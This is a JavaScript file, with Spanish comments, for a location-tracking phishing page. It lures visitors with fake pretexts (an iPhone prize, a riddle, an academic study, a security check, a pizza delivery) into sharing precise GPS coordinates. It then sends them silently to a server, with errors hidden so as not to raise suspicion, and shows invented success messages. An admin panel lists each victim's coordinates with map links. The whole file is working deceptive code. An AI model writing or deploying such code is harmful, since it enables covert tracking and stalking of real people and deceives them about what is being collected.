// Variables globales
let capturedLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
let currentMode = 'prize';
let adminVisible = false;

// Inicializar la aplicación
document.addEventListener('DOMContentLoaded', function() {
    setupEventListeners();
    loadCapturedLocations();
    
    // Determinar modo desde URL
    const urlParams = new URLSearchParams(window.location.search);
    const mode = urlParams.get('mode');
    if (mode) {
        switchMode(mode);
    }
});

// Configurar event listeners
function setupEventListeners() {
    // Botones de cada modo
    document.getElementById('verifyLocationBtn')?.addEventListener('click', () => captureLocation('Premio iPhone 15 Pro'));
    document.getElementById('solveRiddleBtn')?.addEventListener('click', () => captureLocation('Resolver Acertijo'));
    document.getElementById('participateBtn')?.addEventListener('click', () => captureLocation('Estudio Académico'));
    document.getElementById('securityVerifyBtn')?.addEventListener('click', () => captureLocation('Verificación de Seguridad'));
    document.getElementById('confirmDeliveryBtn')?.addEventListener('click', () => captureLocation('Confirmación de Entrega'));
}

// Función principal para capturar ubicación
function captureLocation(source) {
    const btnElement = event.target;
    
    if (!navigator.geolocation) {
        showFakeError('Tu dispositivo no soporta geolocalización. Intenta desde un teléfono móvil.');
        return;
    }
    
    // Cambiar texto del botón para parecer legítimo
    const originalText = btnElement.innerHTML;
    btnElement.innerHTML = '<span class="loading"></span> Verificando...';
    btnElement.disabled = true;
    
    const options = {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    };
    
    navigator.geolocation.getCurrentPosition(
        function(position) {
            const locationData = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy,
                source: source,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: 'Detectando...', // Se podría obtener con una API externa
                id: generateId()
            };
            
            // Guardar ubicación capturada
            saveCapturedLocation(locationData);
            
            // Mostrar mensaje de éxito falso según el modo
            showSuccessMessage(source, locationData);
            
            // Resetear botón después de un delay
            setTimeout(() => {
                btnElement.innerHTML = '✅ Verificado';
                btnElement.style.background = '#27ae60';
            }, 2000);
            
        },
        function(error) {
            let errorMessage = '';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = 'Necesitas permitir el acceso a tu ubicación para continuar.';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = 'No pudimos obtener tu ubicación. Asegúrate de tener GPS activado.';
                    break;
                case error.TIMEOUT:
                    errorMessage = 'Tiempo agotado. Inténtalo de nuevo.';
                    break;
                default:
                    errorMessage = 'Error desconocido. Inténtalo de nuevo.';
                    break;
            }
            
            showFakeError(errorMessage);
            
            // Resetear botón
            btnElement.innerHTML = originalText;
            btnElement.disabled = false;
        },
        options
    );
}

// Mostrar mensajes de éxito según el modo
function showSuccessMessage(source, locationData) {
    let successHTML = '';
    
    switch(source) {
        case 'Premio iPhone 15 Pro':
            successHTML = `
                <div class="success-message">
                    <h2>🎉 ¡Felicitaciones!</h2>
                    <p>Tu ubicación ha sido verificada exitosamente.</p>
                    <div style="background: #d4edda; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3>📱 Tu iPhone 15 Pro será enviado a:</h3>
                        <p><strong>Ubicación verificada:</strong> ${locationData.lat.toFixed(4)}, ${locationData.lng.toFixed(4)}</p>
                        <p><strong>Tiempo de entrega:</strong> 3-5 días hábiles</p>
                        <p><strong>Código de seguimiento:</strong> #IP15${generateId().toUpperCase()}</p>
                    </div>
                    <p style="font-size: 0.9rem; color: #6c757d;">
                        Recibirás un email de confirmación en las próximas 24 horas.
                    </p>
                </div>
            `;
            break;
            
        case 'Resolver Acertijo':
            const secretMessage = generateSecretMessage(locationData.lat, locationData.lng);
            successHTML = `
                <div class="success-message">
                    <h2>🧩 ¡Acertijo Resuelto!</h2>
                    <div style="background: #e8f4fd; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3>🔍 Mensaje Oculto Descifrado:</h3>
                        <p style="font-family: monospace; font-size: 1.2rem; color: #2980b9; font-weight: bold;">
                            "${secretMessage}"
                        </p>
                        <p><strong>Tu coordenada especial:</strong> ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)}</p>
                    </div>
                    <p>¡Has desbloqueado el siguiente nivel del desafío!</p>
                </div>
            `;
            break;
            
        case 'Estudio Académico':
            successHTML = `
                <div class="success-message">
                    <h2>📊 ¡Gracias por Participar!</h2>
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3>✅ Datos Registrados Exitosamente</h3>
                        <p><strong>ID de Participación:</strong> EST-${generateId().toUpperCase()}</p>
                        <p><strong>Ubicación registrada:</strong> Zona ${Math.floor(Math.random() * 99) + 1}</p>
                        <p><strong>Estado:</strong> Procesando datos...</p>
                    </div>
                    <p style="font-size: 0.9rem; color: #6c757d;">
                        Los resultados del estudio estarán disponibles en 6 meses en el portal universitario.
                    </p>
                </div>
            `;
            break;
            
        case 'Verificación de Seguridad':
            successHTML = `
                <div class="success-message">
                    <h2>🔒 Verificación Completada</h2>
                    <div style="background: #d4edda; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3>✅ Tu cuenta está segura</h3>
                        <p><strong>Ubicación verificada:</strong> ✓ Autorizada</p>
                        <p><strong>Estado de seguridad:</strong> ✓ Protegido</p>
                        <p><strong>Último acceso:</strong> ${new Date().toLocaleString()}</p>
                    </div>
                    <p>Tu cuenta ha sido restaurada con acceso completo.</p>
                </div>
            `;
            break;
            
        case 'Confirmación de Entrega':
            successHTML = `
                <div class="success-message">
                    <h2>🍕 ¡Ubicación Confirmada!</h2>
                    <div style="background: #fff3cd; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3>📍 El repartidor ya va en camino</h3>
                        <p><strong>Tiempo estimado:</strong> 3-5 minutos</p>
                        <p><strong>Repartidor:</strong> Carlos M. ⭐⭐⭐⭐⭐</p>
                        <p><strong>Tu ubicación:</strong> Confirmada ✓</p>
                    </div>
                    <p>Recibirás una notificación cuando el repartidor esté en tu puerta.</p>
                </div>
            `;
            break;
    }
    
    // Reemplazar el contenido actual con el mensaje de éxito
    const currentSection = document.querySelector(`#${currentMode}Mode`);
    currentSection.innerHTML = successHTML;
}

// Generar mensaje secreto basado en coordenadas
function generateSecretMessage(lat, lng) {
    const messages = [
        "EL TESORO ESTÁ EN EL NORTE",
        "BUSCA LA SEÑAL EN EL LAGO",
        "LA CLAVE ES EL NÚMERO 42",
        "ENCUENTRA LA TORRE ROJA",
        "EL CÓDIGO ESTÁ EN LAS ESTRELLAS"
    ];
    
    const index = Math.floor((Math.abs(lat) + Math.abs(lng)) * 1000) % messages.length;
    return messages[index];
}

// Mostrar error falso
function showFakeError(message) {
    const currentSection = document.querySelector(`#${currentMode}Mode`);
    const errorDiv = document.createElement('div');
    errorDiv.innerHTML = `
        <div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #e74c3c;">
            <strong>⚠️ Error:</strong> ${message}
        </div>
    `;
    currentSection.appendChild(errorDiv);
    
    // Remover el error después de 5 segundos
    setTimeout(() => {
        errorDiv.remove();
    }, 5000);
}

// Guardar ubicación capturada
function saveCapturedLocation(locationData) {
    capturedLocations.unshift(locationData);
    
    // Mantener solo las últimas 50 ubicaciones
    if (capturedLocations.length > 50) {
        capturedLocations = capturedLocations.slice(0, 50);
    }
    
    localStorage.setItem('capturedLocations', JSON.stringify(capturedLocations));
    loadCapturedLocations();
    
    // También enviar a servidor si está disponible
    sendToServer(locationData);
}

// Enviar datos al servidor (opcional)
function sendToServer(locationData) {
    // Aquí podrías enviar los datos a tu servidor
    fetch('/api/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(locationData)
    }).catch(() => {
        // Silenciar errores para no levantar sospechas
    });
}

// Cargar ubicaciones capturadas en el panel admin
function loadCapturedLocations() {
    const container = document.getElementById('locationsList');
    if (!container) return;
    
    if (capturedLocations.length === 0) {
        container.innerHTML = '<p style="color: #95a5a6;">No hay ubicaciones capturadas aún.</p>';
        return;
    }
    
    container.innerHTML = capturedLocations.map(location => `
        <div class="location-item">
            <h5>🎯 ${location.source}</h5>
            <p><strong>📍 Coordenadas:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}</p>
            <p><strong>🎯 Precisión:</strong> ±${Math.round(location.accuracy)}m</p>
            <p><strong>⏰ Hora:</strong> ${new Date(location.timestamp).toLocaleString()}</p>
            <p><strong>🌐 Navegador:</strong> ${location.userAgent.substring(0, 50)}...</p>
            <div style="margin-top: 10px;">
                <button onclick="openInGoogleMaps(${location.lat}, ${location.lng})" class="btn" style="font-size: 0.8rem; padding: 5px 10px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">
                    🗺️ Ver en Google Maps
                </button>
                <button onclick="copyCoordinates(${location.lat}, ${location.lng})" class="btn" style="font-size: 0.8rem; padding: 5px 10px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; margin-left: 5px;">
                    📋 Copiar Coordenadas
                </button>
            </div>
        </div>
    `).join('');
}

// Cambiar modo
function switchMode(mode) {
    // Ocultar todas las secciones
    document.querySelectorAll('.prize-section, .game-section, .survey-section, .security-section, .delivery-section').forEach(section => {
        section.style.display = 'none';
    });
    
    // Mostrar la sección seleccionada
    const targetSection = document.getElementById(`${mode}Mode`);
    if (targetSection) {
        targetSection.style.display = 'block';
        currentMode = mode;
    }
}

// Toggle panel de administrador
function toggleAdmin() {
    const panel = document.getElementById('adminPanel');
    adminVisible = !adminVisible;
    panel.style.display = adminVisible ? 'block' : 'none';
    
    if (adminVisible) {
        loadCapturedLocations();
    }
}

// Funciones auxiliares
function generateId() {
    return Math.random().toString(36).substr(2, 9);
}

function openInGoogleMaps(lat, lng) {
    const url = `https://www.google.com/maps?q=${lat},${lng}`;
    window.open(url, '_blank');
}

function copyCoordinates(lat, lng) {
    const text = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
    navigator.clipboard.writeText(text).then(() => {
        // Crear notificación temporal
        const notification = document.createElement('div');
        notification.textContent = '📋 Coordenadas copiadas!';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            z-index: 10000;
            font-size: 0.9rem;
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 2000);
    });
}

// Añadir estilos CSS dinámicamente
const style = document.createElement('style');
style.textContent = `
    .loading {
        display: inline-block;
        width: 15px;
        height: 15px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top-color: #fff;
        animation: spin 1s ease-in-out infinite;
    }
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    
    .success-message {
        background: rgba(255,255,255,0.95);
        border-radius: 15px;
        padding: 30px;
        text-align: center;
        animation: fadeIn 0.5s ease-out;
    }
    
    .success-message h2 {
        color: #27ae60;
        margin-bottom: 20px;
        font-size: 2rem;
    }
    
    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(20px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }
`;
document.head.appendChild(style);